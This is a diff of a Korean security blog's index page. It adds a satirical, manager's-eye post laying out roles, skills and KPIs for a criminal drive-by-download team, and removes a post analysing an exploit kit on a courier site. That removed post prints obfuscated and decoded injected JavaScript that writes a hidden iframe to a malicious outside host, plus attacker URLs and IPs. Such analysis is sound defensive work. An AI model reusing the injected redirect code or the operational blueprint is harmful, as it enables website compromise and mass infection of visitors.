@@ -9,7 +9,8 @@
   <meta name="author" content="KC">
 
   
-  <meta name="description" content="JavaScript: The Good Parts 에서 funciton 에 관한 내용을 발췌/정리한다. 자바스크립에는 function 호출에 4 가지 패턴이 있다. The Method Invocation Pattern function 이 Object 의 property &hellip;">
+  <meta name="description" content="Drive-by-Download 를 수행하는 팀을 구성한다면 리쿠루팅은 어떤 뽑아야 하고, 성과 평가는
+어떻게 해야 할까? 하는 관점에서 적어보았다. Traffic Acquisition Engineer 트래픽이 많은 사이트를 해킹하여, 웹 페이지에 iframe &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -65,6 +66,150 @@
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2013/09/13/drive-by-download-managers-perpective/">Drive-by-Download: Manager's Perpective</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2013-09-13T13:22:00+09:00'><span class='date'><span class='date-month'>Sep</span> <span class='date-day'>13</span><span class='date-suffix'>th</span>, <span class='date-year'>2013</span></span> <span class='time'>1:22 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Drive-by-Download 를 수행하는 팀을 구성한다면 리쿠루팅은 어떤 뽑아야 하고, 성과 평가는
+어떻게 해야 할까? 하는 관점에서 적어보았다.</p>
+
+<hr />
+
+<h4>Traffic Acquisition Engineer</h4>
+
+<p>트래픽이 많은 사이트를 해킹하여, 웹 페이지에 iframe 태그등을 삽입하여, 악성 웹사이트로 트래픽을 돌려야 한다. <strong>얼마나 많은 Traffic 을 가져오냐가 KPI</strong></p>
+
+<ol>
+<li>TCP/IP, Linux and web frameworks 에 대한 지식</li>
+<li>Linux, Windows, DNS and routing</li>
+<li>Apache, PHP, WordPress, MySQL, Rails and Django.</li>
+<li>웹 해킹 경험</li>
+<li>SQL Injection, XSS</li>
+</ol>
+
+
+<h4>Exploit Engineer</h4>
+
+<p>Browser, Java, Flash 등의 취약점을 찾아내어 쉘코드를 수행시킬 수 있는 수준까지 코드를 개발해야 한다. <strong>Acquired 된 트래픽 대비 몇 % 를 감염시키냐가 KPI. 10~20% 가 업계 표준</strong></p>
+
+<ul>
+<li>x86 Assembly/Disassembly</li>
+<li>Strong knowledge of Windows memory management</li>
+<li>JavaScript / DOM</li>
+<li>알려진 CVE 를 exploit 할 수 있는 코드 작성 능력.</li>
+<li>Browser, ActiveX control Fuzzer 개발 능력</li>
+</ul>
+
+
+<h4>Payload Engineer</h4>
+
+<p>Exploit 가 성공하는 순간 실행될 Payload 들을 개발해야 한다. 실행화일을 다운로드하여 실행한다던가, 다운로드한 수행코드를 기존 프로세스의 메모리에 집어넣어 돌린다던가 하는 등의 다양한 Payload 를 개발해야 한다. Payload 에는 Exploit 에 들어갈 쉘코드와 1st/2nd stage Dropper 가 포함된다. <strong>Anti-virus 나 IDS 에 걸리지 않고 다양한 네트워크 환경 (i.e. proxy) 에서 동작하는 Payload 개발이 KPI</strong></p>
+
+<ul>
+<li>Windows API (Process, Memory, Thread, API Hooking, PE format)</li>
+<li>Visual C++/x86 Assembly</li>
+</ul>
+
+
+<h4>Rootkit Engineer</h4>
+
+<p>제작된 다양한 소프트웨어에 rootkit 기능을 추가한다.</p>
+
+<ul>
+<li>Proficient in Windows SDK &amp; internals</li>
+<li>Experience in writing usermod &amp; kernelmod rootkits</li>
+</ul>
+
+
+<h4>Undetectability Engineer</h4>
+
+<p>JavaScript 난독화, Payload 난독화, 서버 PHP 난독화, 실행화일 난독화를 수행하는 Tool 을 제작하거나 선정한다. 빌드때마다, 3~40 개의 AV 에 직접 테스트하여 탐지되지 않을 것을 보증해야 한다. <strong>Tool 을 거쳐 작전에 투입되는 화일들이 AV 에 걸리지 않는 것이 KPI</strong></p>
+
+<ol>
+<li>JavaScript and x86 assembly 에 대한 지식</li>
+<li>다양한 JavaScript runtime (v8, spidermonkey, rhino) 에 대한 지식</li>
+<li>Lexer / Paser 제작 경험</li>
+<li>ANTLR, BISON 지식이 있으면 플러스</li>
+<li>AV /IDS Evasion 테크닉</li>
+<li>기본적인 암호 지식</li>
+<li>난독화</li>
+</ol>
+
+
+<h4>C&amp;C / Botnet Engineer</h4>
+
+<p>C&amp;C 서버를 제작한다. Massive 한 좀비 클라이언트들을 관리할 수 있는 안정적이고 스케일러블한 서버와 API 를 개발해야 한다.</p>
+
+<ul>
+<li>대용량의 웹 서버 / Socket 서버 프로그래밍</li>
+<li>PHP 프로그래밍</li>
+<li>P2P 프로토콜에 대한 지식</li>
+<li>Twitter 나 DNS 등의 다양한 통신 채널에 대한 API 활용 능력</li>
+</ul>
+
+
+<h4>Remote Administration Tool Engineer</h4>
+
+<p>피해자의 PC 에 설치되어 키스트로크나 화면 감시등을 할 RDP/VnC 와 같은 리모트 툴을 개발해야 한다. Exploit Engineer 와 협력하여 High value target 에 대한 작전을 수행할 때 사용할 툴 개발을 총괄. Spear phishing 에 사용될 무기화된 PDF/DOC 등을 만드는 일도 겸임한다. Rookit Engineer 와 협력하여 개발된 리모트 툴에 rookit 기능을 추가한다.</p>
+
+<ul>
+<li>Windows 프로그래밍에 능숙 (UI 포함)</li>
+</ul>
+
+
+<h4>Monetization Manager</h4>
+
+<p>돈을 버는 것을 총괄하는 일종의 프로덕트 매니저. 엔지니어들을 총괄 관리하여 게임/뱅킹등 버티컬에 특화된 악성 소프트웨어를 제작할 책임이 있다. 메모리에서 정보를 꺼낸다던가, 인증을 우회하여 결제를 일으키는 기술, 광고 사기 기술들을 연구해야 한다. 파밍 사이트 셋업도  Monetization Manager 의 책임이다. <strong>전체 매출을 책임지며, 특히 감염된 PC 대당 매출을 얼마나 끌어올리는가가 KPI</strong></p>
+
+<ul>
+<li>Social Engineering 이 강해야 함</li>
+<li>People skill</li>
+<li>지불 결제, 가상화폐, 아이템 거래, 광고네트워크(i.e. Ad-sense), 상품권 유통, CPC 광고등에 대한 지식과 경험</li>
+<li>PKI, challenge-response, 2 factor / 2 channel 인증에 대한 지식</li>
+<li>통장/mule/courier 관리.</li>
+<li>가상 재화를 현금화 할 수 있는 채널/네트워크 보유</li>
+</ul>
+
+
+<h4>Network Operator</h4>
+
+<p>Traffic Acquisition Engineer 에게 신규로 접수된 호스트들을 전달받아, 공격 체인에 투입될 수백/수천개의 호스트 풀을 관리한다. Google safe-browsing 이나 Microsoft SmartScreen 등의 서비스에 블랙리스팅된 호스트는 체인에서 빼고 신규 호스트를 투입한다. C&amp;C 호스트를 관리하고 C&amp;C 호스트를 NIC/DNS 에 등록/관리하는것도 Network Operator 의 책임이다.</p>
+
+<ul>
+<li>Linux/Windows Administration Skills</li>
+<li>DNS / Nameserver / Hosting 에 대한 경험</li>
+</ul>
+
+
+<hr />
+
+<p>JD 를 만들어 따져보니, 생각보다 다양한 스킬을 가진 사람들이 필요하다.</p>
+
+<p>이런 팀을 운영하려면 인건비 + 경비가 일년에 20 억 정도가 들 듯 하다.</p>
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -999,135 +1144,6 @@ javac GenericSet.java
 
     </article>
   
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2013/08/29/the-long-goodbye/">The Long Goodbye</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2013-08-29T23:58:00+09:00'><span class='date'><span class='date-month'>Aug</span> <span class='date-day'>29</span><span class='date-suffix'>th</span>, <span class='date-year'>2013</span></span> <span class='time'>11:58 pm</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>EK 가 설치되어 있는 사이트.</p>
-
-<p>G마켓 자체 페이지는 아니고, 배송조회하면 연결되는 택배회사의 배송조회 페이지.</p>
-
-<pre><code>URL: hxxp://www.yellowcap.co.kr/custom/inquiry_result.asp?INVOICE_NO=81800192001
-</code></pre>
-
-<p>페이지 소스를 보니,</p>
-
-<pre><code>&lt;script type="text/javascript" language="javascript" src="/common/js/embed.js"&gt;&lt;/script&gt;
-</code></pre>
-
-<p>로 embed.js 를 땡기고 있었다.</p>
-
-<p>embed.js 를 보니, 마지막에 다음과 같은 redirection code 가 들어있었다.</p>
-
-<pre><code>eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};
-if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];
-e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}
-return p}('d(3.7.c(\'4=\')==-1){e 2=f h();2.g(2.i()+b*5*5*8);3.7=\'4=9;a=/;2=\'+2.j();
-3.p("&lt;6 s=r://u.w/v/t/q/l.k m=n o=0&gt;&lt;/6&gt;")}',33,33,
-'||expires|document|hsblm|60|iframe|cookie|1000|Yes|path|12|indexOf|if|var|new|setTime|Date|getTime|
-toGMTString|html|ye|width|100|height|write|pop|http|src|goods|dangguro|upload|com'.split('|'),0,{}))
-</code></pre>
-
-<p>난독화 해제를 했더니,</p>
-
-<pre><code>if (document.cookie.indexOf('hsblm=') == -1) {
-    var expires = new Date();
-    expires.setTime(expires.getTime() + 12 * 60 * 60 * 1000);
-    document.cookie = 'hsblm=Yes;path=/;expires=' + expires.toGMTString();
-    document.write("&lt;iframe src=http://dangguro.com/upload/goods/pop/ye.html width=100 height=0&gt;&lt;/iframe&gt;")
-}
-</code></pre>
-
-<p>로 dangguro.com 으로 traffic 을 돌리는 iframe 을 삽입한다.</p>
-
-<pre><code>URL: hxxp://dangguro.com/upload/goods/pop/ye.html
-</code></pre>
-
-<p>ye.html 을 봤더니</p>
-
-<pre><code>&lt;iframe src=http://www.zzizile.net//data/geditor/1307/pop/index.html width='1' height='1'&gt;&lt;/iframe&gt;
-</code></pre>
-
-<p>로 다시 redirect 한다.</p>
-
-<pre><code>URL: hxxp://www.zzizile.net//data/geditor/1307/pop/index.html
-</code></pre>
-
-<p>www.zzizile.net 을 따라가 보았다.</p>
-
-<pre><code>&lt;script language="javascript" src="http://count5.51yes.com/click.aspx?id=52194144&amp;logo=1" charset="gb2312"&gt;&lt;/script&gt;
-&lt;script type="text/javascript" src="swfobject.js"&gt;&lt;/script&gt;
-&lt;script src=jpg.js&gt;&lt;/script&gt;
-&lt;script type="text/javascript"&gt;
-var tmoRu2=navigator.userAgent.toLowerCase();
-var NOmT2="1"+"1"+"1";
-if(document.cookie.indexOf("YCAo6=")==-1 &amp;&amp; tmoRu2.indexOf("linux")&lt;=-1 &amp;&amp; tmoRu2.indexOf("bot")==-1 &amp;&amp; tmoRu2.indexOf("spider")==-1)
-{
-var VJhjJoY8=deconcept.SWFObjectUtil.getPlayerVersion();
-var expires=new Date();
-expires.setTime(expires.getTime()+24*60*60*1000);
-NOmT2="0"+"0";
-document.cookie="YCAo6=Yes;path=/;expires="+expires.toGMTString();
-if(document.location.hostname.length&gt;0){pimOD5="1"+"1";delete pimOD5;try{pimOD5+=
-"0"+"0"+"0"+"0"+"0"+"0"+"0"+"0"+"0"+"0";}catch(e){var IzhH1="1";AMJP8 = eval}mOQyUG8=unescape;}
-gROR3="3C7F265941303D6B32471514405B3D4439482417BE6D1343C4453A0FA317510ABF19510EAB045234FF580122B3
-421825FB560261C0511620C225542CD621EE38DA24E031C763FE11DE25E84F9969F319817BBC54CE57EF12B541FA18A501C01FB654
-...
-</code></pre>
-
-<p>로 시작하는 heavily obfuscated 된 자바스크립트가 나온다.</p>
-
-<p>swfobject.js 가 있는 것으로 봐서, 여기서부터 Browser fingerprinting 을 해서, 취약한 부분을 찾아내,
-적절한 공격을 하는 것으로 보인다.</p>
-
-<p>일단 이 화일을 VirusTotal 에 올려보았다.</p>
-
-<p>45 개의 Anti-virus 엔진중에서 19 개가 악성으로 판정하였다. 국산 엔진들은 잡아내지 못했다.</p>
-
-<p>McAfee 는 JS/Exploit-Godakit.a 라고 판정하고 BitDefender 는 JS:Exploit.BlackHole.AL 이라고 판정하였다.</p>
-
-<p>사용된 화일로 봐서는, Gong Da 가 맞다.</p>
-
-<p>Sandbox 에 넣고 돌렸다.</p>
-
-<p>튀어나오는 URL 들은</p>
-
-<pre><code>http://www.uthkorea.com
-
-http://www.monggus.com
-
-http://count18.51yes.com
-
-http://211.43.212.192
-
-http://101.79.5.31
-</code></pre>
-
-<p>이다. count18.51yes.com 은 China Telecom Jiangsu 라는 업체에서 호스팅하고 있다.</p>
-</div>
-  
-  
-
-
-    </article>
-  
   <div class="pagination">
     
       <a class="prev" href="/posts/21">&larr; Older</a>
@@ -1145,6 +1161,10 @@ http://101.79.5.31
   <ul id="recent_posts">
     
       <li class="post">
+        <a href="/blog/2016/06/20/iphone-security/">iPhone Security</a>
+      </li>
+    
+      <li class="post">
         <a href="/blog/2016/06/17/cve-2016-0728/">CVE-2016-0728</a>
       </li>
     
@@ -1158,10 +1178,6 @@ http://101.79.5.31
     
       <li class="post">
         <a href="/blog/2016/06/14/hitcon-ctf-2014-unexploitable-heap-overflow/">HITCON CTF 2014 'Unexploitable' Heap Overflow</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2016/06/14/glibc-adventures-the-forgotten-chunks/">Glibc Adventures: The Forgotten Chunks</a>
       </li>
     
   </ul>
